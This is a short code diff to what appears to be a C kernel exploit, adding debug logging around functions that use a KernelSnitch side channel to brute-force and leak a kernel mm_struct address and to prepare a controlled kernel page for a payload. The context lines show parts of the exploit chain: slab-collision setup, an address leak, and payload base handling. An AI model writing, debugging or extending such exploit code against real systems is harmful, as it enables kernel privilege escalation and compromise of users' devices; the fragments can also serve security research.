@@ -442,6 +442,8 @@ static void put_slide_bank_entry(unsigned char *p, uintptr_t payload_base,
 void setup_kernelsnitch(void) {
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
+  pr_info("pkp: ks_setup begin MM_STRUCT_SZ=%zx objs_per_slab=%zu cpu=%d\n",
+          (size_t)MM_STRUCT_SZ, mm_objs_per_slab, cpu_count);
   ks = kernelsnitch_setup(
       MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS,
       KERNELSNITCH_VERBOSE, KERNELSNITCH_MTE_ENABLED);
@@ -2055,6 +2057,7 @@ static void cleanup_failed_kernel_page(const char *reason) {
 #endif
 
 uintptr_t prepare_kernel_page(int payload_mode) {
+  pr_info("pkp: enter mode=%d\n", payload_mode);
 #if defined(APP_CONTROLLED_MM_GROUP_RECLAIM) && \
     APP_CONTROLLED_MM_GROUP_RECLAIM
   return prepare_controlled_kernel_page(payload_mode);
@@ -2089,6 +2092,8 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
+  pr_info("pkp: pre-ks_setup cpu=%d MM_STRUCT_SZ=%zx\n",
+          cpu_count, (size_t)MM_STRUCT_SZ);
   ks = kernelsnitch_setup(
       MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS,
       KERNELSNITCH_VERBOSE, KERNELSNITCH_MTE_ENABLED);
@@ -2161,6 +2166,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   log_mm_slabinfo("after-child-exit");
 #endif
 
+  pr_info("pkp: pre-collision-check\n");
   if (!kernelsnitch_found_collisions(ks)) {
     pr_warning("KernelSnitch collision finding failed\n");
 #if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
@@ -2176,8 +2182,10 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     return 0;
   }
 
+  pr_info("pkp: pre-bruteforce\n");
   kernelsnitch_bruteforce(ks);
   uintptr_t leaked = ks->mm_struct;
+  pr_info("pkp: post-bruteforce leaked=%016zx\n", leaked);
   if (leaked == (uintptr_t)-1) {
     pr_warning("KernelSnitch mm_struct leak failed\n");
 #if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
